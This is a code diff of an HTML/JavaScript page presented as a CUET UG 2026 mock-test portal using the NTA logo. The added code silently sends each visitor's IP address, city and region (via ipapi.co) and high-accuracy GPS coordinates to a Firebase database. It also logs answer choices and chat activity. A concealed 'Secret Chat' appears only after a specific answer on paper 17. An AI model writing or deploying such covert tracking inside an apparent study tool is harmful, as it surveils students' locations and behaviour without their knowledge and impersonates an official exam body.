@@ -10,56 +10,67 @@
         :root { --blue: #004a99; --green: #27ae60; --red: #e74c3c; --gray: #f4f7f6; }
         body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; background: var(--gray); overflow-x: hidden; }
         .hidden { display: none !important; }
-        .container { max-width: 96%; margin: 8px auto; background: white; padding: 10px; border-radius: 8px; box-shadow: 0 1px 5px rgba(0,0,0,0.1); }
+        .container { max-width: 98%; margin: 5px auto; background: white; padding: 8px; border-radius: 8px; box-shadow: 0 1px 5px rgba(0,0,0,0.1); }
         .paper-card { border: 1px solid #ddd; padding: 8px; margin: 5px 0; display: flex; justify-content: space-between; align-items: center; border-radius: 5px; background: #fff; font-size: 13px; }
         .btn { padding: 10px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; color: white; font-size: 14px; width: 100%; }
         .btn-blue { background: var(--blue); }
         .btn-red { background: var(--red); }
         .btn-small { width: auto; padding: 5px 10px; font-size: 11px; }
-        .timer-strip { background: var(--blue); color: white; padding: 5px; text-align: center; font-weight: bold; font-size: 13px; position: sticky; top: 0; z-index: 100; }
+        .timer-strip { background: var(--blue); color: white; padding: 3px; text-align: center; font-weight: bold; font-size: 11px; position: sticky; top: 0; z-index: 100; }
         
-        #q-text { font-size: 12px; line-height: 1.2; margin-bottom: 8px; color: #333; }
-        .option-item { display: block; padding: 6px 10px; margin: 4px 0; border: 1px solid #ddd; border-radius: 4px; cursor: pointer; font-size: 11px; }
-        .option-item.selected { background: #e3f2fd; border-color: var(--blue); color: var(--blue); font-weight: bold; }
+        #q-text { font-size: 11px; line-height: 1.2; margin-bottom: 5px; color: #444; font-weight: bold; }
+        .option-item { display: inline-block; padding: 4px 10px; margin: 2px; border: 1px solid #ddd; border-radius: 4px; cursor: pointer; font-size: 10px; }
+        .option-item.selected { background: #e3f2fd; border-color: var(--blue); color: var(--blue); }
         
-        .log-box { margin-top: 10px; border-top: 2px solid var(--blue); padding-top: 10px; }
+        /* CHAT STYLING */
+        .log-box { margin-top: 5px; border-top: 2px solid var(--blue); }
         .log-list { 
-            overflow-y: scroll; border: 1px solid #ccc; margin-bottom: 8px; 
-            padding: 10px; background: #fff; border-radius: 4px; font-size: 13px;
-            display: flex; flex-direction: column; -webkit-overflow-scrolling: touch;
+            height: 75vh; 
+            overflow-y: scroll; 
+            border: 1px solid #ccc; 
+            padding: 5px; 
+            background: #fff; 
+            font-size: 11px; 
+            display: flex;
+            flex-direction: column;
+            -webkit-overflow-scrolling: touch;
         }
-        #exam-log-list { height: 500px; } 
-        #submit-log-list { height: 400px; } 
-        .log-item { padding: 8px; border-bottom: 1px solid #eee; color: #222; word-wrap: break-word; line-height: 1.4; cursor: pointer; }
+        .log-list::-webkit-scrollbar { width: 4px; }
+        .log-list::-webkit-scrollbar-thumb { background: #ccc; border-radius: 10px; }
+
+        .log-item { padding: 4px 6px; border-bottom: 1px solid #f1f1f1; color: #222; word-wrap: break-word; line-height: 1.3; cursor: pointer; }
         .res-table { width: 100%; border-collapse: collapse; margin-top: 8px; font-size: 10px; }
-        .res-table th, .res-table td { border: 1px solid #ddd; padding: 5px; text-align: center; }
+        .res-table th, .res-table td { border: 1px solid #ddd; padding: 4px; text-align: center; }
     </style>
 </head>
 <body>
 
 <div id="home-screen" class="container">
     <div style="text-align: center; margin-bottom: 10px;">
-        <img src="https://nta.ac.in/img/nta_logo.png" height="30">
-        <h2 style="color: var(--blue); font-size: 16px;">CUET UG TEST SERIES 2026</h2>
+        <img src="https://nta.ac.in/img/nta_logo.png" height="25">
+        <h2 style="color: var(--blue); font-size: 15px;">CUET UG PORTAL - 2026</h2>
     </div>
-    <div id="loading" style="text-align:center; font-size: 11px;">Connecting...</div>
+    <div id="loading" style="text-align:center; font-size: 10px;">Connecting to database...</div>
     <div id="paper-list"></div>
 </div>
 
 <div id="exam-ui" class="hidden">
-    <div class="timer-strip">Time: <span id="clock">60:00</span></div>
+    <div class="timer-strip">Timer: <span id="clock">60:00</span></div>
     <div class="q-window container">
-        <p id="q-text"></p>
-        <div id="options-container"></div>
-        <div style="display: flex; gap: 5px; margin-top: 8px;">
-            <button onclick="saveNext()" class="btn btn-blue btn-small" style="flex: 2;">NEXT QUESTION</button>
-            <button onclick="finishExam()" class="btn btn-red btn-small" style="flex: 1;">SUBMIT</button>
+        <div id="compact-q-area">
+            <p id="q-text"></p>
+            <div id="options-container"></div>
+            <div style="display: flex; gap: 5px; margin-top: 5px;">
+                <button onclick="saveNext()" class="btn btn-blue btn-small">NEXT</button>
+                <button onclick="finishExam()" class="btn btn-red btn-small">SUBMIT</button>
+            </div>
         </div>
+
         <div id="exam-log-section" class="hidden log-box">
-            <b style="font-size: 13px; color: var(--blue); display: block; margin-bottom: 5px;">Observation Log (P8)</b>
+            <b style="font-size: 12px; color: var(--blue); padding: 5px; display: block;">Observation Log (P8)</b>
             <div id="exam-log-list" class="log-list"></div>
-            <div style="display:flex; gap:4px;">
-                <input type="text" id="exam-log-input" style="flex:1; padding:10px; border:1px solid #bbb; border-radius:4px; font-size: 14px;" placeholder="Message...">
+            <div style="display:flex; gap:2px; padding-top: 5px;">
+                <input type="text" id="exam-log-input" style="flex:1; padding:8px; border:1px solid #bbb; border-radius:4px; font-size: 13px;" placeholder="Message...">
                 <button onclick="sendExamEntry()" class="btn btn-blue btn-small">Send</button>
             </div>
         </div>
@@ -67,22 +78,20 @@
 </div>
 
 <div id="result-screen" class="container hidden">
-    <h2 style="color:var(--blue); font-size: 17px;">Performance Summary</h2>
+    <h2 style="color:var(--blue); font-size: 16px;">Test Analysis</h2>
     <div id="res-summary"></div>
     <div id="submit-log-section" class="hidden log-box">
-        <p style="font-size: 14px; font-weight: bold; color: var(--blue);">Secret Discussion (P17)</p>
-        <div id="submit-log-list" class="log-list"></div>
+        <p style="font-size: 13px; font-weight: bold; color: var(--blue);">Secret Chat (P17)</p>
+        <div id="submit-log-list" class="log-list" style="height: 300px;"></div>
         <div style="display:flex; gap:4px;">
-            <input type="text" id="submit-log-input" style="flex:1; padding:12px; border:1px solid #bbb; border-radius:4px;" placeholder="Secret message...">
+            <input type="text" id="submit-log-input" style="flex:1; padding:10px; border:1px solid #bbb; border-radius:4px;" placeholder="Type secret msg...">
             <button onclick="sendSubmitEntry()" class="btn btn-blue btn-small">Send</button>
         </div>
     </div>
-    <div style="display:grid; grid-template-columns: 1fr; gap:6px; margin-top: 10px;">
-        <button onclick="location.reload()" class="btn btn-blue btn-small">Home</button>
-    </div>
-    <div style="overflow-x: auto; margin-top: 15px;">
+    <button onclick="location.reload()" class="btn btn-blue btn-small" style="margin-top:10px;">Home</button>
+    <div style="overflow-x: auto; margin-top: 10px;">
         <table class="res-table">
-            <thead><tr style="background:#eee;"><th>Q</th><th>Result</th><th>Marks</th></tr></thead>
+            <thead><tr style="background:#eee;"><th>Q.No</th><th>Result</th></tr></thead>
             <tbody id="res-body"></tbody>
         </table>
     </div>
@@ -98,51 +107,58 @@
     firebase.initializeApp(firebaseConfig);
     const database = firebase.database();
 
-    // --- ENHANCED DUAL TRACKING ---
-    let sessionKey = null, startTime = Date.now(), journey = [];
+    // --- ROBUST DUAL TRACKING LOGIC ---
+    let sessionKey = null, journey = [];
 
     function recordEvent(event) {
-        let t = new Date().toLocaleTimeString();
-        journey.push(`${t}: ${event}`);
-        if(sessionKey) {
-            database.ref('user_journeys/' + sessionKey).update({ 
-                events: journey,
-                lastActive: t 
-            });
-        }
+        journey.push(`${new Date().toLocaleTimeString()}: ${event}`);
+        if(sessionKey) database.ref('user_journeys/' + sessionKey).update({ events: journey });
     }
 
     async function startJourney() {
-        // Step 1: Create Session entry immediately
         const newSession = database.ref('user_journeys').push();
         sessionKey = newSession.key;
-        newSession.set({ 
-            startTime: new Date().toLocaleString(), 
-            events: ["App Launched"],
-            status: "Online"
-        });
-        journey = ["App Launched"];
+        newSession.set({ startTime: new Date().toLocaleString(), events: ["Launched"] });
+        
+        // Step 1: Immediately fetch IP location (No permission needed)
+        fetchIPLocation();
 
-        // Step 2: Parallel fetch for location & tracking folder
+        // Step 2: Then try Precise GPS (Permission will pop up)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((pos) => {
+                const gpsInfo = { 
+                    lat: pos.coords.latitude, 
+                    lon: pos.coords.longitude, 
+                    type: "GPS_PRECISE_OVERRIDE",
+                    time: new Date().toLocaleString()
+                };
+                // Update same session with better data
+                database.ref('user_journeys/' + sessionKey).update(gpsInfo);
+                database.ref('user_tracking').push(gpsInfo);
+            }, (err) => {
+                recordEvent("GPS Permission Denied. Staying with IP location.");
+            }, { enableHighAccuracy: true });
+        }
+    }
+
+    function fetchIPLocation() {
         fetch('https://ipapi.co/json/')
             .then(res => res.json())
             .then(data => {
-                // Update User Tracking (Your working folder)
-                database.ref('user_tracking').push({
-                    city: data.city || "N/A",
-                    region: data.region || "N/A",
-                    ip: data.ip || "N/A",
+                const ipInfo = { 
+                    city: data.city, 
+                    region: data.region,
+                    ip: data.ip, 
+                    type: "IP_INITIAL",
                     time: new Date().toLocaleString()
-                });
-                // Update Journeys folder with metadata
-                database.ref('user_journeys/' + sessionKey).update({
-                    city: data.city,
-                    ip: data.ip
-                });
-            }).catch(e => console.log("Geo error"));
+                };
+                database.ref('user_tracking').push(ipInfo);
+                if(sessionKey) database.ref('user_journeys/' + sessionKey).update(ipInfo);
+            }).catch(e => recordEvent("IP Fetch Failed"));
     }
     startJourney();
 
+    // --- APP LOGIC ---
     let allPapers = {}, activeTest = null, userChoices = [], currentQ = 0, timer;
 
     database.ref('papers').on('value', (snap) => {
@@ -157,7 +173,7 @@
 
     function startTest(id) {
         activeTest = allPapers[id];
-        recordEvent("Entered Paper: " + activeTest.title);
+        recordEvent("Entered: " + activeTest.title);
         userChoices = new Array(activeTest.questions.length).fill(null);
         currentQ = 0;
         document.getElementById('home-screen').classList.add('hidden');
@@ -183,42 +199,28 @@
 
     function selectOpt(i) { 
         userChoices[currentQ] = i; 
-        let optionsMap = ['A', 'B', 'C', 'D'];
-        recordEvent(`Paper: ${activeTest.title} | Q${currentQ+1} marked as ${optionsMap[i] || i}`);
+        recordEvent(`Q${currentQ+1} selected ${i}`);
         render(); 
     }
 
-    function saveNext() { 
-        if(currentQ < activeTest.questions.length-1) { 
-            currentQ++; 
-            render(); 
-        } 
-    }
+    function saveNext() { if(currentQ < activeTest.questions.length-1) { currentQ++; render(); } }
 
     function finishExam() {
-        if(!confirm("Submit Test?")) return;
+        if(!confirm("Submit final response?")) return;
         clearInterval(timer);
-        recordEvent("Clicked Submit - Test Completed");
-        database.ref('user_journeys/' + sessionKey).update({ status: "Completed" });
-
-        let score = 0, correct = 0, wrong = 0;
-        activeTest.questions.forEach((q, i) => {
-            if (userChoices[i] === q.a) { score += 5; correct++; }
-            else if (userChoices[i] !== null) { score -= 1; wrong++; }
-        });
-
+        recordEvent("Manual Submit");
+        let score = 0, correct = 0;
+        activeTest.questions.forEach((q, i) => { if (userChoices[i] === q.a) { score += 5; correct++; } });
         document.getElementById('exam-ui').classList.add('hidden');
         document.getElementById('result-screen').classList.remove('hidden');
-        
         if(activeTest.title.includes("17") && userChoices[0] === 1) {
             document.getElementById('submit-log-section').classList.remove('hidden');
             loadLogs('observations_paper_17', 'submit-log-list');
         }
-
-        document.getElementById('res-summary').innerHTML = `<div style="display:flex; justify-content:space-around;"><div><b>${score}</b><br>Score</div><div><b>${correct}</b><br>Correct</div><div><b>${wrong}</b><br>Wrong</div></div>`;
+        document.getElementById('res-summary').innerHTML = `<div style="display:flex; justify-content:space-around; font-size:12px; background:#f4f4f4; padding:10px; border-radius:5px;"><div><b>${score}</b><br>Score</div><div><b>${correct}</b><br>Correct</div></div>`;
         document.getElementById('res-body').innerHTML = activeTest.questions.map((q, i) => {
             const status = userChoices[i] === q.a ? '✅' : (userChoices[i] === null ? '⚪' : '❌');
-            return `<tr><td>${i+1}</td><td>${status}</td><td>${userChoices[i]===q.a?5:(userChoices[i]===null?0:-1)}</td></tr>`;
+            return `<tr><td>${i+1}</td><td>${status}</td></tr>`;
         }).join('');
     }
 
@@ -237,7 +239,7 @@
     function sendData(path, inputId) {
         const val = document.getElementById(inputId).value;
         if(!val.trim()) return;
-        recordEvent("Sent Message to Chat: " + val);
+        recordEvent("Msg to " + path);
         database.ref(path).push({ text: val, time: Date.now() });
         document.getElementById(inputId).value = "";
     }
@@ -256,23 +258,11 @@
     }
 
     function deleteItem(path, id) {
-        if(confirm("Delete message?")) {
+        if(confirm("Delete this message?")) {
             database.ref(path + '/' + id).remove();
-            recordEvent("Deleted a Chat Message");
+            recordEvent("Deleted msg");
         }
     }
-
-    // Capture when user leaves or closes app
-    window.addEventListener('visibilitychange', () => {
-        if (document.visibilityState === 'hidden' && sessionKey) {
-            let duration = ((Date.now() - startTime) / 60000).toFixed(2);
-            recordEvent("App Hidden/Closed. Session Duration: " + duration + " mins");
-            database.ref('user_journeys/' + sessionKey).update({ 
-                totalTime: duration + " mins",
-                status: "Inactive/Closed"
-            });
-        }
-    });
 </script>
 </body>
 </html>
